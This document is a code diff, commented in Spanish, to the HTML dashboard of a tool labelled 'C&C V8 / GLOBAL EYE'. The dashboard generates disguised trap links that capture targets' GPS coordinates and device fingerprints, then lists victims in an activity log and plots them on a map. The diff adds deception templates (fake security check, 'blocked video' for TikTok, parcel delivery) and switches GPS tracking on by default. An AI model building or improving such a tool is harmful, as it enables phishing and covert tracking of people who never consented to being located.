@@ -5,13 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>C&C V7</title>
+    <title>C&C V8</title>
     
-    <script>
-        if (!sessionStorage.getItem("secure_token")) {
-            window.location.href = "/logout";
-        }
-    </script>
+    <script>if(!sessionStorage.getItem("secure_token")) window.location.href="/logout";</script>
 
     <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Round" rel="stylesheet">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
@@ -22,45 +18,34 @@
         :root { --bg: #0f0f11; --card: #1e1e24; --accent: #00ff88; --text: #ffffff; --text-sec: #8b8b93; --danger: #ff4757; }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { background-color: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; padding: 0; height: 100vh; overflow: hidden; }
-        
-        .header { padding: 40px 20px 10px 20px; display: flex; align-items: center; justify-content: space-between; background: var(--bg); z-index: 10; position: relative; }
+        .header { padding: 40px 20px 10px 20px; display: flex; align-items: center; justify-content: space-between; background: var(--bg); z-index: 10; }
         .header h1 { font-size: 22px; margin: 0; font-weight: 800; letter-spacing: 1px; }
         .status-badge { background: rgba(0, 255, 136, 0.1); color: var(--accent); padding: 4px 10px; border-radius: 20px; font-size: 10px; font-weight: bold; display: flex; align-items: center; gap: 5px; border: 1px solid rgba(0, 255, 136, 0.2); }
         .dot { width: 6px; height: 6px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 8px var(--accent); }
-
         .content-area { height: calc(100vh - 140px); overflow-y: auto; padding: 20px; padding-bottom: 100px; }
-        
         #map-container { height: 100%; width: 100%; border-radius: 20px; overflow: hidden; display: none; }
         #map { height: 100%; width: 100%; }
-
         .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(15, 15, 17, 0.95); backdrop-filter: blur(10px); border-top: 1px solid #333; display: flex; justify-content: space-around; padding: 15px 0 25px 0; z-index: 100; }
         .nav-item { color: var(--text-sec); text-align: center; font-size: 10px; display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer; width: 33%; transition: 0.2s; }
         .nav-item.active { color: var(--accent); transform: scale(1.1); }
         .nav-item span { font-size: 26px; }
-
         .view { display: none; animation: fadeIn 0.3s ease; }
         .view.active { display: block; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
-
         .card { background: var(--card); border-radius: 20px; padding: 20px; margin-bottom: 20px; border: 1px solid #2a2a30; }
         .label { font-size: 10px; color: var(--text-sec); font-weight: 700; margin-bottom: 8px; display: block; letter-spacing: 1px; }
-        input { width: 100%; background: #000; border: 1px solid #333; color: #fff; padding: 14px; border-radius: 12px; font-size: 14px; outline: none; transition: 0.2s; }
+        input, select { width: 100%; background: #000; border: 1px solid #333; color: #fff; padding: 14px; border-radius: 12px; font-size: 14px; outline: none; transition: 0.2s; }
         input:focus { border-color: var(--accent); }
-        
         .btn { width: 100%; padding: 16px; border-radius: 14px; border: none; font-weight: 700; font-size: 15px; cursor: pointer; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 8px; }
         .btn-primary { background: var(--accent); color: #000; box-shadow: 0 4px 15px rgba(0, 255, 136, 0.2); }
         .btn-danger { background: rgba(255, 71, 87, 0.1); color: var(--danger); border: 1px solid rgba(255, 71, 87, 0.2); }
-        
         .log-item { display: flex; gap: 15px; padding: 15px 0; border-bottom: 1px solid #2a2a30; }
         .log-icon { min-width: 40px; height: 40px; background: #2a2a30; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px; }
         .log-info { flex: 1; overflow: hidden; }
         .log-title { font-weight: bold; font-size: 14px; margin-bottom: 2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
         .log-meta { font-size: 11px; color: var(--text-sec); display: flex; align-items: center; gap: 5px; }
-        
         .log-map-btn { color: #000; font-size: 11px; font-weight: 800; text-decoration: none; display: inline-flex; align-items: center; gap: 4px; margin-top: 6px; background: #fbce49; padding: 4px 10px; border-radius: 6px; cursor: pointer; box-shadow: 0 0 10px rgba(251, 206, 73, 0.3); transition: 0.2s; }
-        
-        .log-tech { font-size: 10px; color: var(--accent); margin-top: 6px; font-family: monospace; border: 1px solid #333; padding: 6px; border-radius: 6px; background: #000; display: block; width: 100%; }
-
+        .log-tech { font-size: 10px; color: var(--accent); font-family: monospace; margin-top: 5px; display: block; border-top: 1px dashed #333; padding-top: 4px; }
         .row-switch { display: flex; justify-content: space-between; align-items: center; background: #000; padding: 12px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #333; }
         .switch { position: relative; display: inline-block; width: 44px; height: 24px; }
         .switch input { opacity: 0; width: 0; height: 0; }
@@ -68,18 +53,15 @@
         .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 3px; bottom: 3px; background-color: white; transition: .3s; border-radius: 50%; }
         input:checked + .slider { background-color: var(--danger); }
         input:checked + .slider:before { transform: translateX(20px); }
-
         .swal2-popup { background: #1e1e24 !important; color: white !important; border-radius: 20px !important; border: 1px solid #333; }
         .swal2-title { color: white !important; font-size: 18px !important; }
         .swal2-content { color: #aaa !important; }
-        .swal2-confirm { background: var(--accent) !important; color: black !important; border-radius: 10px !important; font-weight: bold !important; }
-        .swal2-cancel { background: #333 !important; color: white !important; border-radius: 10px !important; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <h1>GLOBAL EYE <span style="color:var(--accent)">V7</span></h1>
+        <h1>GLOBAL EYE <span style="color:var(--accent)">V8</span></h1>
         <a href="/logout" style="text-decoration:none;"><div class="status-badge" style="background:rgba(255, 71, 87, 0.1); color:#ff4757; border-color:rgba(255, 71, 87, 0.3);"><span class="material-icons-round" style="font-size:14px;">logout</span> SALIR</div></a>
     </div>
 
@@ -88,16 +70,22 @@
         <div id="view-home" class="view active">
             <div class="card">
                 <label class="label">LINK REAL</label>
-                <input type="text" id="urlDestino" placeholder="https://...">
-                <div style="height:15px"></div>
-                <label class="label">REFERENCIA</label>
+                <input type="text" id="urlDestino" placeholder="Pega el enlace aquí...">
+                <div style="height:10px"></div>
+                <label class="label">NOMBRE REFERENCIA</label>
                 <input type="text" id="nombreTrampa" placeholder="Ej: Objetivo 1">
                 
-                <div style="height:20px"></div>
-                
+                <div style="height:15px"></div>
+                <label class="label">HISTORIA DE ENGAÑO (DISFRAZ)</label>
+                <select id="templateType" style="margin-bottom:15px;">
+                    <option value="security">🛡️ Verificación de Seguridad (Genérico)</option>
+                    <option value="video" selected>📺 Video Bloqueado (Para TikTok)</option>
+                    <option value="delivery">📦 Entrega de Paquete</option>
+                </select>
+
                 <div class="row-switch">
-                    <span style="font-size:12px; font-weight:600;">🛰️ MODO SATÉLITE (GPS)</span>
-                    <label class="switch"><input type="checkbox" id="checkGPS"><span class="slider round"></span></label>
+                    <span style="font-size:12px; font-weight:600;">🛰️ RASTREO SATELITAL (GPS)</span>
+                    <label class="switch"><input type="checkbox" id="checkGPS" checked><span class="slider round"></span></label>
                 </div>
                 
                 <div class="row-switch">
@@ -123,7 +111,7 @@
 
         <div id="view-logs" class="view">
             <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
-                <h2 style="margin:0; font-size:18px;">Registro de Actividad</h2>
+                <h2 style="margin:0; font-size:18px;">Actividad</h2>
                 <button onclick="cargarLogs()" style="background:none; border:none; color:var(--accent);"><span class="material-icons-round">refresh</span></button>
             </div>
             <div id="logs-container"></div>
@@ -142,9 +130,15 @@
     </div>
 
     <div class="nav-bar">
-        <div class="nav-item active" onclick="cambiarVista('home', this)"><span class="material-icons-round">add_circle</span>Crear</div>
-        <div class="nav-item" onclick="cambiarVista('logs', this)"><span class="material-icons-round">list_alt</span>Lista</div>
-        <div class="nav-item" onclick="cambiarVista('map', this)"><span class="material-icons-round">public</span>Mapa</div>
+        <div class="nav-item active" onclick="cambiarVista('home', this)">
+            <span class="material-icons-round">add_circle</span>Crear
+        </div>
+        <div class="nav-item" onclick="cambiarVista('logs', this)">
+            <span class="material-icons-round">list_alt</span>Lista
+        </div>
+        <div class="nav-item" onclick="cambiarVista('map', this)">
+            <span class="material-icons-round">public</span>Mapa
+        </div>
     </div>
 
     <script>
@@ -178,8 +172,10 @@
         function focalizarObjetivo(lat, lon) {
             document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
             document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            
             document.getElementById('view-map').classList.add('active');
             document.querySelectorAll('.nav-item')[2].classList.add('active');
+
             setTimeout(() => {
                 initMap();
                 map.invalidateSize(); 
@@ -210,6 +206,7 @@
                 url_destino: document.getElementById('urlDestino').value,
                 usar_gps: document.getElementById('checkGPS').checked,
                 one_time: document.getElementById('checkBurn').checked,
+                template_type: document.getElementById('templateType').value,
                 meta_titulo: document.getElementById('metaTitulo').value,
                 meta_desc: document.getElementById('metaDesc').value
             };
@@ -265,12 +262,9 @@
                     
                     if(log.lat && log.lon) {
                         gpsIcon = `<span style="color:var(--danger); font-size:12px; margin-left:5px;">● GPS</span>`;
-                        gpsBtn = `<div class="gps-action-btn" onclick="focalizarObjetivo(${log.lat}, ${log.lon})">
-                            📍 VER EN MAPA
-                        </div>`;
+                        gpsBtn = `<div class="log-map-btn" onclick="focalizarObjetivo(${log.lat}, ${log.lon})">📍 VER EN MAPA</div>`;
                     }
 
-                    // MOSTRAR RAYOS X
                     let fingerprintHTML = "";
                     if(log.fingerprint) {
                         fingerprintHTML = `<div class="log-tech">${log.fingerprint}</div>`;
